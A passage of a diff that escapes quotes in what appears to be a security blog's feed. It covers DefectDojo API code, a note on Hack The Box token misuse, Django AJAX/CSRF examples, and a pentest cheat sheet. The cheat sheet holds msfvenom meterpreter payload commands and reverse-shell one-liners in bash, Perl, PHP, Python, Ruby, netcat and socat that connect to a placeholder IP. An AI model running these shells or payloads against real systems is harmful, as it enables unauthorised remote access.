+        print((colored(tabulate(data, tablefmt=&quot;fancy_grid&quot;, headers=[&quot;#&quot;, &quot;ID Product&quot;, &quot;Name&quot;, &quot;URL&quot;, &quot;Findings&quot;, &quot;Product Type&quot;, &quot;Description&quot;, &quot;Platform&quot;, &quot;Lifecycle&quot;, &quot;Origin&quot;]), &apos;green&apos;)))
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The next def is an example in which can be upladed report scans for the tools integrated in DefectDojo:&lt;/p&gt;
@@ -1827,36 +1827,36 @@ $ ./run_dojo.bash
 
     url = DefectDojoURL + &quot;/api/v2/import-scan/&quot;
 
-    headers = {'Authorization':apiKey}
+    headers = {&apos;Authorization&apos;:apiKey}
     data = []
     n = 0
 
-    engagement_id = '/api/v2/engagements/' + engegementID + '/'
-    active = 'true'
-    tags = 'test'
-    build = 'test'
-    minimum_severity = 'Info'
-    lead = 'http://X.X.X.X:8888/api/v2/users/1/?id=1'
+    engagement_id = &apos;/api/v2/engagements/&apos; + engegementID + &apos;/&apos;
+    active = &apos;true&apos;
+    tags = &apos;test&apos;
+    build = &apos;test&apos;
+    minimum_severity = &apos;Info&apos;
+    lead = &apos;http://X.X.X.X:8888/api/v2/users/1/?id=1&apos;
 
     dataV2 = {
-      'engagement': ('', engagement_id),
-      'verified': ('', active),
-      'lead': ('', lead),
-      'tags': ('', tags),
-      'scan_date': ('', scan_date),
-      'scan_type': ('', scan_type),
-      'minimum_severity': ('', minimum_severity),
-      'file': open(PathFile, 'rb'),
-      'active': ('', active)
+      &apos;engagement&apos;: (&apos;&apos;, engagement_id),
+      &apos;verified&apos;: (&apos;&apos;, active),
+      &apos;lead&apos;: (&apos;&apos;, lead),
+      &apos;tags&apos;: (&apos;&apos;, tags),
+      &apos;scan_date&apos;: (&apos;&apos;, scan_date),
+      &apos;scan_type&apos;: (&apos;&apos;, scan_type),
+      &apos;minimum_severity&apos;: (&apos;&apos;, minimum_severity),
+      &apos;file&apos;: open(PathFile, &apos;rb&apos;),
+      &apos;active&apos;: (&apos;&apos;, active)
     }
 
     jsondata = fetch_data(url, headers, dataV2, true)
 
     if jsondata:
         n += 1
-        data.append([n, jsondata['active'], jsondata['engagement'], jsondata['lead'], jsondata['minimum_severity'], jsondata['scan_date'], jsondata['scan_type'], jsondata['verified']])
+        data.append([n, jsondata[&apos;active&apos;], jsondata[&apos;engagement&apos;], jsondata[&apos;lead&apos;], jsondata[&apos;minimum_severity&apos;], jsondata[&apos;scan_date&apos;], jsondata[&apos;scan_type&apos;], jsondata[&apos;verified&apos;]])
 
-        print((colored(tabulate(data, tablefmt=&quot;fancy_grid&quot;, headers=[&quot;#&quot;, &quot;Active&quot;, &quot;Engagement&quot;, &quot;Lead&quot;, &quot;Minimum severity&quot;, &quot;Scan Date&quot;, &quot;Scan Type&quot;, &quot;Verified&quot;]), 'green')))
+        print((colored(tabulate(data, tablefmt=&quot;fancy_grid&quot;, headers=[&quot;#&quot;, &quot;Active&quot;, &quot;Engagement&quot;, &quot;Lead&quot;, &quot;Minimum severity&quot;, &quot;Scan Date&quot;, &quot;Scan Type&quot;, &quot;Verified&quot;]), &apos;green&apos;)))
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
@@ -1873,7 +1873,7 @@ $ ./run_dojo.bash
 
 &lt;p&gt;From my point of view this is an issue because this functionality is provided under the web application and not by an external API isolated service (is just one HTTP POST call), so is somebody is able to get my token could play every day reseting machines with something as simple as this HTTP POST:&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -i -s -k -X $'POST' $'https://www.hackthebox.eu/api/vm/reset/133?api_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -i -s -k -X $&apos;POST&apos; $&apos;https://www.hackthebox.eu/api/vm/reset/133?api_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&apos;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;This is just my thoughts about APIs, called WebAPIs, and the authentication applied to this type of HTTP services, should have more authentication mechanism? In my opinion yes, not just a token string, like other user identification id, expiry date, session expiration, operation id, link the token with the user cookie or session, etc.&lt;/p&gt;
@@ -2152,7 +2152,7 @@ msf exploit(multi/handler) &amp;gt; run
 
 &lt;p&gt;&lt;strong&gt;msfvenom&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -e x86/shikata_ga_nai -b &apos;\x00\x0a\x0d\x26&apos; -f python --smallest
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -f war &amp;gt; shell.war
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=4444 -f elf &amp;gt; shell.elf
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -2171,7 +2171,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=444
 &lt;h3 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h3&gt;
 
 &lt;p&gt;&lt;strong&gt;Upgrade shell&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;);'
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;);&apos;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Listener&lt;/strong&gt;&lt;/p&gt;
@@ -2185,16 +2185,16 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=444
 bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/4444 0&amp;gt;&amp;amp;1
 
 # Perl
-perl -e 'use Socket;$i=&quot;&amp;lt;IP&amp;gt;&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+perl -e &apos;use Socket;$i=&quot;&amp;lt;IP&amp;gt;&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;
 
 # PHP
-php -r '$sock=fsockopen(&quot;&amp;lt;IP&amp;gt;&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
+php -r &apos;$sock=fsockopen(&quot;&amp;lt;IP&amp;gt;&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&apos;
 
 # Python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;IP&amp;gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;IP&amp;gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;
 
 # Ruby
-ruby -rsocket -e'f=TCPSocket.open(&quot;&amp;lt;IP&amp;gt;&quot;,80).to_i;exec sprintf(&quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&quot;,f,f,f)'
+ruby -rsocket -e&apos;f=TCPSocket.open(&quot;&amp;lt;IP&amp;gt;&quot;,80).to_i;exec sprintf(&quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&quot;,f,f,f)&apos;
 
 # Netcat
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;IP&amp;gt; 4444 &amp;gt;/tmp/f
@@ -2204,7 +2204,7 @@ nc -e /bin/sh &amp;lt;IP&amp;gt; 444
 0&amp;lt;&amp;amp;196; exec 196&amp;lt;&amp;gt;/dev/tcp/&amp;lt;IP&amp;gt;/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196
 
 # Socat
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&amp;lt;IP&amp;gt;:4444 
+socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:&amp;lt;IP&amp;gt;:4444 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;bind-shell&quot;&gt;Bind Shell&lt;/h3&gt;
@@ -2412,7 +2412,7 @@ js_fonts
 
 &lt;h3 id=&quot;url-dispatcher&quot;&gt;URL dispatcher&lt;/h3&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url(r'^ajaxjsonrpc/$', views.jsonrpc, name='jsonrpc')
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url(r&apos;^ajaxjsonrpc/$&apos;, views.jsonrpc, name=&apos;jsonrpc&apos;)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;viewcontroller&quot;&gt;View/Controller&lt;/h3&gt;
@@ -2421,7 +2421,7 @@ js_fonts
 def ping(request):
     data = request
     # Work with json data received
-    return 'pong'
+    return &apos;pong&apos;
 
 
 @csrf_protect
@@ -2439,12 +2439,12 @@ def jsonrpc(request):
 
 function getCookie(name) {
     var cookieValue = null;
-    if (document.cookie &amp;amp;&amp;amp; document.cookie != '') {
-        var cookies = document.cookie.split(';');
+    if (document.cookie &amp;amp;&amp;amp; document.cookie != &apos;&apos;) {
+        var cookies = document.cookie.split(&apos;;&apos;);
         for (var i = 0; i &amp;lt; cookies.length; i++) {
             var cookie = jQuery.trim(cookies[i]);
             // Does this cookie string begin with the name we want?
-            if (cookie.substring(0, name.length + 1) == (name + '=')) {
+            if (cookie.substring(0, name.length + 1) == (name + &apos;=&apos;)) {
                 cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                 break;
             }
@@ -2453,7 +2453,7 @@ function getCookie(name) {
     return cookieValue;
 }
 
-var csrftoken = getCookie('csrftoken');
+var csrftoken = getCookie(&apos;csrftoken&apos;);
 function csrfSafeMethod(method) {
     // these HTTP methods do not require CSRF protection
     return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
@@ -2494,26 +2494,26 @@ $.jrpc(&quot;http://127.0.0.1:8000/ajaxjsonrpc/&quot;,
 
 &lt;h3 id=&quot;url-dispatcher-1&quot;&gt;URL dispatcher&lt;/h3&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url(r'^ajax/AJAXviewsExample/$', views.AJAXviewsExample, name='AJAXviewsExample')
-url(r'^ajax/AJAXviewsGET/$', views.AJAXviewsGET, name='AJAXviewsGET')
-url(r'^ajax/AJAXviewsPOST/$', views.AJAXviewsPOST, name='AJAXviewsPOST')
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url(r&apos;^ajax/AJAXviewsExample/$&apos;, views.AJAXviewsExample, name=&apos;AJAXviewsExample&apos;)
+url(r&apos;^ajax/AJAXviewsGET/$&apos;, views.AJAXviewsGET, name=&apos;AJAXviewsGET&apos;)
+url(r&apos;^ajax/AJAXviewsPOST/$&apos;, views.AJAXviewsPOST, name=&apos;AJAXviewsPOST&apos;)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;viewcontroller-1&quot;&gt;View/Controller&lt;/h3&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@csrf_protect
 def AJAXviewsExample(request):
-  if request.method == 'GET':
+  if request.method == &apos;GET&apos;:
        print &quot;DATA&quot; + str(request)
-  elif request.method == 'POST':
-       print &quot;DATA&quot; + str(request.POST.get('data'))
+  elif request.method == &apos;POST&apos;:
+       print &quot;DATA&quot; + str(request.POST.get(&apos;data&apos;))
 
 @csrf_protect
 def AJAXviewsGET(request):
     if request.is_ajax():
-        items = ['one 1', 'two 2']
+        items = [&apos;one 1&apos;, &apos;two 2&apos;]
         data = json.dumps(items)
-        return HttpResponse(data, content_type='application/json')
+        return HttpResponse(data, content_type=&apos;application/json&apos;)
     else:
         raise Http404
 
@@ -2522,8 +2522,8 @@ def AJAXviewsPOST(request):
     print &quot;add_todo 1&quot;
     if request.is_ajax() and request.POST:
         print &quot;add_todo 2&quot;
-        data = {'message': &quot;%s added&quot; % request.POST.get('item')}
-        return HttpResponse(json.dumps(data), content_type='application/json')
+        data = {&apos;message&apos;: &quot;%s added&quot; % request.POST.get(&apos;item&apos;)}
+        return HttpResponse(json.dumps(data), content_type=&apos;application/json&apos;)
     else:
         raise Http404
 
@@ -2536,12 +2536,12 @@ def AJAXviewsPOST(request):
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
   function getCookie(name) {
     var cookieValue = null;
-    if (document.cookie &amp;amp;&amp;amp; document.cookie != '') {
-        var cookies = document.cookie.split(';');
+    if (document.cookie &amp;amp;&amp;amp; document.cookie != &apos;&apos;) {
+        var cookies = document.cookie.split(&apos;;&apos;);
         for (var i = 0; i &amp;lt; cookies.length; i++) {
             var cookie = jQuery.trim(cookies[i]);
             // Does this cookie string begin with the name we want?
-            if (cookie.substring(0, name.length + 1) == (name + '=')) {
+            if (cookie.substring(0, name.length + 1) == (name + &apos;=&apos;)) {
                 cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                 break;
             }
@@ -2550,7 +2550,7 @@ def AJAXviewsPOST(request):
     return cookieValue;
 }
 
-var csrftoken = getCookie('csrftoken');
+var csrftoken = getCookie(&apos;csrftoken&apos;);
 function csrfSafeMethod(method) {
     // these HTTP methods do not require CSRF protection
     return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
@@ -2578,7 +2578,7 @@ $.ajax({
     url: &quot;http://127.0.0.1:8000/ajax/AJAXviewsGET/&quot;,
     success: function(data) {
         for(i = 0; i &amp;lt; data.length; i++){
-          $('ul').append('&amp;lt;li&amp;gt;'+data[i]+'&amp;lt;/li&amp;gt;');
+          $(&apos;ul&apos;).append(&apos;&amp;lt;li&amp;gt;&apos;+data[i]+&apos;&amp;lt;/li&amp;gt;&apos;);
       }
     }
 });
